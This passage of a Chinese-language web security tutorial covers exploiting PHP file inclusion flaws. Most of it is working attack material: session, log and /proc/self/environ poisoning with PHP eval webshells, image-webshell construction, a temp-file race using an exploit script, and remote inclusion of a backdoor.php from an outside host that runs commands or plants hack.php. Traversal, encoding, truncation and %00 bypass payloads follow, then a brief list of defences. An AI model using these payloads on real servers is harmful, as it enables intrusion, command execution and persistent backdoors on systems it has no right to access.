也就是说，当对session文件进行base64解密时，前16个字符固然被解密为乱码，但不会再影响从第17个字符后的部分也就是base64加密后的username。

那么这里注册一个账号`JohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnson&lt;?php eval($_GET['abcdefg']) ?&gt;`,其base64加密后的长度为128，大于100。（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，名称都为`sess_cookie值`）

访问：<code>http://x.x.x.x/index.php<br>
?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_0d0385dc6a1067f4e3406191<br>
&amp;abcdefg=phpinfo();</code>

成功执行，即成功getshell了。

例子2：现在有一个session.php可控用户会话信息值：

```
session_start();
    $username = $_POST['username'];
    $_SESSION['username'] = $username;
```

可以看到这个session.php文件中的用户会话信息username的值是用户可控制的，那我们就可以传入恶意代码进行攻击利用。

如果这里有注册功能，那么我们先注册一个用户`&lt;?php phpinfo();?&gt;`。然后用其登录：`username=&lt;?php phpinfo();?&gt;`。等登陆成功后，记录下cookie中的PHPSESSID的值，这里为`r7csmqpu1lul3elgsb6o9g6u1b`。（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，那么直接不注册输入`&lt;?php phpinfo();?&gt;`登录也能生成，名称都为`sess_cookie值`）

我们这里以上帝视角来查看下session文件，可见恶意代码被写入了：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a9ffc0fe93308b78.png)

将恶意代码传入以后，接下来就要利用文件包含漏洞去包含这个恶意代码。

`fileinclude.php?file=D:\phpStudy\PHPTutorial\tmp\tmp\sess_r7csmqpu1lul3elgsb6o9g6u1b`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01aa2581c0b283920e.png)

**<a class="reference-link" name="%E6%B3%A8%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"></a>注意命令执行和写入木马**

都是可以的，只要将上面的`&lt;?php phpinfo();?&gt;`替换成所对应的php代码，然后进行包含文件即可。

### <a class="reference-link" name="%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97"></a>包含日志

**<a class="reference-link" name="%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97"></a>访问日志**

利用条件：

需要知道服务器日志的存储路径，且日志文件可读。

姿势：

很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入`access.log`，当发生错误时将错误写入`error.log`。默认情况下，日志保存路径在 `/var/log/apache2/`。

日志存储默认路径：

```
1.apache+Linux日志默认路径：/etc/httpd/logs/access.log或/var/log/httpd/access.log

2.apache+win2003日志默认路径：D:\xampp\apache\logs\access.log、D:\xampp\apache\logs\error.log

3.IIS6.0+win2003默认日志文件：C:\WINDOWS\system32\Logfiles

4.IIS7.0+win2003 默认日志文件：%SystemDrive%\inetpub\logs\LogFiles

5.nginx 日志文件：日志文件在用户安装目录logs目录下,假设安装路径为/usr/local/nginx,那日志目录就是在/usr/local/nginx/logs下面
```

但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。比如下面的`&lt;?php phpinfo();?&gt;`修改为`%3C?php%20phpinfo();%20?%3E`

[![](https://p4.ssl.qhimg.com/t010ad1154c36749765.png)](https://p4.ssl.qhimg.com/t010ad1154c36749765.png)

正常的php代码已经写入了 `/var/log/apache2/access.log`，然后进行包含即可。

在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。

中间件默认配置文件存放路径：

```
1.apache+linux 默认配置文件
        /etc/httpd/conf/httpd.conf或/etc/init.d/httpd

2. IIS6.0+win2003 配置文件
        C:/Windows/system32/inetsrv/metabase.xml

3. IIS7.0+WIN 配置文件
        C:\Windows\System32\inetsrv\config\applicationHost.config
```

<a class="reference-link" name="%E6%B3%A8%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"></a>**注意命令执行和写入木马**

都是可以的，只要将上面的`&lt;?php phpinfo();?&gt;`替换成所对应的php代码，然后像上面一样注意下编码问题，然后进行包含文件即可。

**<a class="reference-link" name="SSH%20log"></a>SSH log**

利用条件：

需要知道`ssh-log`的位置，且可读。默认情况下为

1./var/log/auth.log

2./var/log/secure

姿势：

用ssh连接：

`ssh '&lt;?php phpinfo(); ?&gt;'[@remotehost](https://github.com/remotehost)`

之后会提示输入密码，随便输入就可以。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c5b194cf75b94ea3.png)

然后在`remotehost`的`ssh-log`中就写入了这个php代码

然后利用文件包含，包含日志文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01641fc4032fa5c527.png)

<a class="reference-link" name="%E6%B3%A8%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"></a>**注意命令执行和写入木马**

都是可以的，只要将上面的`&lt;?php phpinfo();?&gt;`替换成所对应的php代码，然后进行包含文件即可。

### <a class="reference-link" name="%E5%8C%85%E5%90%ABenviron"></a>包含environ

利用条件：
1. php以cgi方式运行，这样environ才会保持UA头。
1. environ文件存储位置已知，且environ文件可读。environ文件默认位置：`/proc/self/environ`。在Linux系统下(FreeBSD是没有这个的)。Windows系统没有。
姿势：

`proc/self/environ`中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。

例如：我们现在访问一个网站，使用burpsuite抓包，将恶意代码插入到user-agent中：

[![](https://p4.ssl.qhimg.com/t0128edf860508eb9c3.png)](https://p4.ssl.qhimg.com/t0128edf860508eb9c3.png)

然后利用文件包含漏洞去包含`proc/self/environ`，成功执行php代码。

[![](https://p0.ssl.qhimg.com/t0175b4c8fb7a1ff6d2.png)](https://p0.ssl.qhimg.com/t0175b4c8fb7a1ff6d2.png)

<a class="reference-link" name="%E6%B3%A8%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"></a>**注意命令执行和写入木马**

都是可以的，只要将上面的`&lt;?php phpinfo();?&gt;`替换成所对应的php代码，然后进行包含文件即可。

### <a class="reference-link" name="%E5%8C%85%E5%90%ABfd(%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6)"></a>包含fd(文件描述符)

文件描述符：File descriptor,简称fd，当应用程序请求内核打开/新建一个文件时，内核会返回一个文件描述符用于对应这个打开/新建的文件，其fd本质上就是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。

默认位置：`/proc/self/fd/`。在Linux系统下。Windows系统没有。

和`包含environ`类似。

**<a class="reference-link" name="%E6%B3%A8%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"></a>注意命令执行和写入木马**

都是可以的，同`包含environ`。

### <a class="reference-link" name="%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"></a>包含上传文件

很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。

利用条件：

千变万化，不过至少得知道上传的文件在哪，叫啥名字。

姿势：

先得制作图片马，有两种方式：

第一种是在cmd命令行下，比如图片1.jpg和包含php代码`fputs(fopen('hack.php','w'),'&lt;?php [@eval](https://github.com/eval)($_POST[v])?&gt;');?&gt;`的2.php，它们得在同一目录，然后cmd在该目录下执行：`copy 1.jpg/b+2.php 3.jpg`，将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg

假设已经上传一句话图片木马到服务器，路径为`/upload/202107.jpg`

然后访问URL：`http://x.x.x.x/index.php?page=./upload/202107.jpg`，包含这张图片，将会在`index.php`所在的目录下生成`hack.php`，然后用shell管理工具就能成功连接。

那么同理，命令执行也是可行的。不过都getshell了，其中也能命令执行。

### <a class="reference-link" name="%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"></a>包含临时文件

这里先来一张原理图。这种姿势类似利用临时文件的存在，竞争时间去包含的：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01561a2f4c958ce606.png)

php中上传文件，会创建临时文件。在linux下使用`/tmp`目录，而在windows下使用`c:\winsdows\temp`目录。在临时文件被删除之前，利用竞争即可包含该临时文件。

由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535种不同的文件名，所以这个方法是可行的。

另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可：

条件：

存在phpinfo页面并且存在文件包含漏洞

原理：

```
1.当我们给PHP发送POST数据包时，如果数据包里包含文件区块，PHP就会将文件保存成一个临时文件，路径通常为：/tmp/php[6个随机字符],这个临时文件，在请求结束后就会被删除。 

2.因为phpinfo页面会将请求上下文中的所有变量打出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，就可以在返回包里找到临时文件名，也就是\$_FILES变量中的内容。
```

姿势：

类似利用临时文件的存在，竞争时间去包含的。

这里我是以Linux下的环境为例，脚本也是只有服务器是Linux系统才能使用：

首先我们使用vulhub的脚本：[vulhub/exp.py at master](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)。他可以实现包含临时文件，而这个临时文件的内容是：`&lt;?php fileputcontents('/tmp/p','&lt;?=eval($_REQUEST[1])?&gt;')?&gt;`。成功包含这个文件后就会生成新的文件`/tmp/p`，这个文件就会永久的留在目标机器上。

[![](https://p4.ssl.qhimg.com/t0141b594a3b5527eac.png)](https://p4.ssl.qhimg.com/t0141b594a3b5527eac.png)

写入成功以后，我们利用文件包含来执行任意命令。

[![](https://p2.ssl.qhimg.com/t016c8eff88bb0b194b.png)](https://p2.ssl.qhimg.com/t016c8eff88bb0b194b.png)

那么vulhub的脚本是如何做到在临时脚本文件删除前去包含的呢？其实就是用到了条件竞争，具体流程大致如下：

```
1.首先发送包含webshell的数据包给phpinfo页面，并用大量的垃圾数据将header和get等位置填满。

2.因phpinfo页面会将所有数据打印出来，第一个步骤中的垃圾数据就会将phpinfo页面撑的非常大。而php默认输出缓冲区大小为4096，也可以理解为php每次返回4096个字节给socket连接。

3.所以，这里直接操作原生socket，每次读取4096个字节。只要我们读取到字节里包含临时文件名，就立刻发送文件包含漏洞利用的数据包。因为第一个数据包的socket连接没有结束，所以临时文件还没有删除，我们就可以文件包含成功。
```

### <a class="reference-link" name="%E5%85%B6%E4%BB%96%E5%8C%85%E5%90%AB%E5%A7%BF%E5%8A%BF"></a>其他包含姿势

一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析了。比如还能：包含SMTP(日志)等等，这里就不展开了。



## 绕过姿势

接下来谈一谈绕过姿势。实战的时候肯定不会是像上面`包含姿势`的测试代码中那样简简单单的`include $_GET['file'];`这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：

```
&lt;?php
    $file = $_GET['file'];
    include '/var/www/html/'.$file.'/test/test.php';
?&gt;
```

这样就很“难”直接去包含前面提到的种种文件。

### <a class="reference-link" name="%E9%81%87%E5%88%B0%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E7%9A%84%E6%83%85%E5%86%B5"></a>遇到指定前缀的情况

先考虑一下指定了前缀的情况吧。测试代码:

```
&lt;?php
    $file = $_GET['file'];
    include '/var/www/html/'.$file;
?&gt;
```

这里存在一个疑惑，不知道有没有人可以解答下：

我测试了用Windows下的phpstudy。如果用Windows的话，`include 'D:\phpStudy\PHPTutorial\WWW\'.$file;`，然后目录遍历`../`会报错`Parse error:syntax error, unexpected ''D:\phpStudy\PHPTutorial\WWW\'' (T_ENCAPSED_AND_WHITESPACE) in D:\phpStudy\PHPTutorial\WWW\fileinclude1.php on line 3`，最后一个反斜杠`\`必须要写成正斜杠`/`然后用目录遍历`../`才能成功。

**<a class="reference-link" name="%E8%A7%A3%E5%86%B3%EF%BC%9A%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"></a>解决：目录遍历**

现在在`/var/log/test.txt`文件中有php代码`&lt;?php phpinfo();?&gt;`，则利用`../`可以进行目录遍历，比如我们尝试访问：

```
include.php?file=../../log/test.txt
```

则服务器端实际拼接出来的路径为：`/var/www/html/../../log/test.txt`，也即`/var/log/test.txt`。从而包含成功。

[![](https://p1.ssl.qhimg.com/t01254a3bc341b1cb02.png)](https://p1.ssl.qhimg.com/t01254a3bc341b1cb02.png)

**<a class="reference-link" name="%E8%A7%A3%E5%86%B3%EF%BC%9A%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"></a>解决：编码绕过**

服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。<br>**1.利用url编码**
<li>../
<ul>
- %2e%2e%2f
- ..%2f
- %2e%2e/- %2e%2e%5c
- ..%5c
- %2e%2e\
**2.二次编码**
<li>../
<ul>
- %252e%252e%252f- %252e%252e%255c
**3.容器/服务器的编码方式**
<li>../
<ul>
<li>..%c0%af
<ul>
<li>注：[Why does Directory traversal attack %C0%AF work?](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
</li>- 注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）
- Apache Tomcat Directory Traversal(Apache Tomcat 目录遍历)- ..%c1%9c
### <a class="reference-link" name="%E9%81%87%E5%88%B0%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E7%9A%84%E6%83%85%E5%86%B5"></a>遇到指定后缀的情况

接着考虑指定后缀的情况。测试代码:

```
&lt;?php
    $file = $_GET['file'];
    include $file.'/test/test.php';
?&gt;
```

**<a class="reference-link" name="%E8%A7%A3%E5%86%B3%EF%BC%9AURL"></a>解决：URL**

url格式

```
protocol://hostname[:port]/path/[;parameters][?query]#fragment
```

在远程文件包含漏洞（RFI）中，可以利用query（?）或fragment（#）来绕过后缀限制。那么利用条件就需要是：
1. `allow_url_fopen = On`
1. `allow_url_include = On`
<a class="reference-link" name="%E5%A7%BF%E5%8A%BF%E4%B8%80%EF%BC%9Aquery%EF%BC%88?%EF%BC%89"></a>**姿势一：query（?）**

```
index.php?file=http://remoteaddr/remoteinfo.txt?
```

则包含的文件为 `http://remoteaddr/remoteinfo.txt?/test/test.php`<br>
问号后面的部分`/test/test.php`，也就是指定的后缀被当作query从而被绕过。

<a class="reference-link" name="%E6%B3%A8%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"></a>**注意命令执行和写入木马**

如：`http://x.x.x.x/fileinclude2.php?file=http://x.x.x.x/backdoor.php?`

backdoor.php中的php代码为`&lt;?php system('whoami'); ?&gt;`，结果成功命令执行了

[![](https://p2.ssl.qhimg.com/t01efce432255eb6ff6.png)](https://p2.ssl.qhimg.com/t01efce432255eb6ff6.png)

也可以将php代码替换为`fputs(fopen('hack.php','w'),'&lt;?php [@eval](https://github.com/eval)($_POST[v])?&gt;');?&gt;`写入木马`hack.php`，用shell管理工具连接

<a class="reference-link" name="%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%9Afragment%EF%BC%88#(%23)%EF%BC%89"></a>**姿势二：fragment（#(%23)）**

```
index.php?file=http://remoteaddr/remoteinfo.txt%23
```

则包含的文件为 `http://remoteaddr/remoteinfo.txt#/test/test.php`<br>
问号后面的部分`/test/test.php`，也就是指定的后缀被当作fragment从而被绕过。注意需要把`#`进行url编码为`%23`。

<a class="reference-link" name="%E6%B3%A8%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"></a>**注意命令执行和写入木马**

如：`http://x.x.x.x/fileinclude2.php?file=http://x.x.x.x/backdoor.php%23`

backdoor.php中的php代码为`&lt;?php system('whoami'); ?&gt;`，结果成功命令执行了

也可以将php代码替换为`fputs(fopen('hack.php','w'),'&lt;?php [@eval](https://github.com/eval)($_POST[v])?&gt;');?&gt;`写入木马`hack.php`，用shell管理工具连接

<a class="reference-link" name="%E6%B3%A8%E6%84%8F%EF%BC%9AWindows%E5%92%8CLinux%E4%B8%8B%E7%9A%84%E5%8C%BA%E5%88%AB"></a>**注意：Windows和Linux下的区别**

在Linux下，是上面这种情况；

在Windows下有些许不同：不加`?`或者`#(%23)`也可以执行，加了也可以执行，而且`#`不进行url编码和进行url编码为`%23`都是可以执行的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0163916a79d7a1deca.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0167fb228e826837d4.png)

**<a class="reference-link" name="%E8%A7%A3%E5%86%B3%EF%BC%9A%E5%88%A9%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE"></a>解决：利用伪协议**

前面有提到过利用zip伪协议和phar伪协议。假设现在测试代码为：

```
&lt;?php
    $file = $_GET['file'];
    include $file.'/test/test.php';
?&gt;
```

<a class="reference-link" name="%E5%A7%BF%E5%8A%BF%E4%B8%80%EF%BC%9A%E5%88%A9%E7%94%A8zip%E4%BC%AA%E5%8D%8F%E8%AE%AE"></a>**姿势一：利用zip伪协议**

构造压缩包如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01eb8b44b7e9918a70.png)

其中test.php内容为：

```
&lt;?php phpinfo(); ?&gt;
```

注意要指定绝对路径，若是使用相对路径，则会文件包含失败。一些别的利用条件等请看上面的`zip://`

```
fileinclude2.php?file=zip://D:\phpStudy\PHPTutorial\WWW\J0.zip%23J0
```

则拼接后为：`zip://D:\phpStudy\PHPTutorial\WWW\J0.zip#J0/test/test.php`

[![](https://p0.ssl.qhimg.com/t014e39cc550a88de67.png)](https://p0.ssl.qhimg.com/t014e39cc550a88de67.png)

能成功包含。

<a class="reference-link" name="%E6%B3%A8%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"></a>**注意命令执行和写入木马**

都是可以的，具体看`zip://`

<a class="reference-link" name="%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8phar%E4%BC%AA%E5%8D%8F%E8%AE%AE"></a>**姿势二：利用phar伪协议**

利用phar伪协议有限制条件：php版本大于等于php 5.3.4。我测试用了php版本为5.2.17，然后使用下面的绝对路径与相对路径的方式都会报错：

```
Warning: include(phar://J0.zip\J0/test/test.php) [function.include]: failed to open stream: Invalid argument in D:\phpStudy\PHPTutorial\WWW\fileinclude2.php on line 3

Warning: include() [function.include]: Failed opening 'phar://J0.zip\J0/test/test.php' for inclusion (include_path='.;C:\php5\pear') in D:\phpStudy\PHPTutorial\WWW\fileinclude2.php on line 3

```

而以下能成功是因为我用的php版本为5.4.45。

还有一些别的利用条件等请看上面的`phar://`。

构造压缩包同上面姿势一相同

指定绝对路径：

```
fileinclude2.php?file=phar://D:\phpStudy\PHPTutorial\WWW\J0.zip\J0
```

则拼接后为：`phar://D:\phpStudy\PHPTutorial\WWW\J0.zip\J0/test/test.php`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016a1d0b9e4b5c3767.png)

能成功包含。

使用相对路径（这里`J0.zip`就在当前目录下，和`fileinclude2.php`同一目录）:

```
fileinclude2.php?file=phar://J0.zip\J0
```

则拼接后为：`phar://J0.zip\J0/test/test.php`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c409fa37ac9c2890.png)

<a class="reference-link" name="%E6%B3%A8%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"></a>**注意命令执行和写入木马**

都是可以的，具体看`phar://`

<a class="reference-link" name="%E8%A7%A3%E5%86%B3%EF%BC%9A%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"></a>**解决：长度截断**

利用条件： php版本小于php 5.2.8

目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复`./`

```
index.php?file=phpinfo.php././././。。。省略。。。././
```

则后缀`/test/test.php`，在达到最大值后会被直接丢弃掉。

这是我在windows下的实践，如下这样刚刚好截断：

```
fileinclude2.php?file=phpinfo.php/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01bf650bec620e5d68.png)

成功执行。如果还想再加`./`也是可以的，不过不能超过此服务器的容量限制，不然会这样：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f929dd6b107323dd.png)

<a class="reference-link" name="%E6%B3%A8%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"></a>**注意命令执行和写入木马**

都是可以的，只要将上面的`&lt;?php phpinfo();?&gt;`替换成所对应的php代码，然后进行包含文件即可。

<a class="reference-link" name="%E8%A7%A3%E5%86%B3%EF%BC%9A%00%E6%88%AA%E6%96%AD"></a>**解决：%00截断**

%00截断原理：

截断的核心，就是 `chr(0)`这个字符。先说一下这个字符，这个字符不为空 `(Null)`，也不是空字符 `("")`，更不是空格。 当程序在输出含有 `chr(0)`变量时 `chr(0)`后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生。

利用条件：
1. magic_quotes_gpc = Off（当On时，所有的`'`(单引号)，`"` (双引号)，`/`(反斜线)和`NULL`字符都会被自动加上一个反斜杠`\`进行转义。然后这时再用`%00`会变成`\0`，被转义了）
1. php版本小于php 5.3.4
```
index.php?file=phpinfo.php%00
```

[![](https://p2.ssl.qhimg.com/t01bb552732995aeda5.png)](https://p2.ssl.qhimg.com/t01bb552732995aeda5.png)

<a class="reference-link" name="%E6%B3%A8%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"></a>**注意命令执行和写入木马**

都是可以的，只要将上面的`&lt;?php phpinfo();?&gt;`替换成所对应的php代码，然后进行包含文件即可。



## 防御方案
1. 在很多场景中都需要去包含web目录之外的文件，如果php配置了`open_basedir`，则会包含失败。所以PHP 中使用`open_basedir`配置限制访问在指定的区域。
1. 做好文件的权限管理。
1. 对可以包含的文件进行限制，可以采用白名单的方式，或设置可以包含的目录。
1. 对危险字符进行过滤，比如过滤`.`（点）`/`（反斜杠）`\`（反斜杠）等特殊字符。
1. 尽量将allow_url_fopen和allow_url_include配置为off，不过像有些伪协议还是能使用，不过能尽量off还是off吧。
1. 尽量不使用动态包含等等
参考：

[https://blog.csdn.net/weixin_50464560/article/details/115051595](https://blog.csdn.net/weixin_50464560/article/details/115051595)

[https://blog.csdn.net/weixin_50464560/article/details/115053230](https://blog.csdn.net/weixin_50464560/article/details/115053230)

[https://xz.aliyun.com/t/1576#toc-7](https://xz.aliyun.com/t/1576#toc-7)
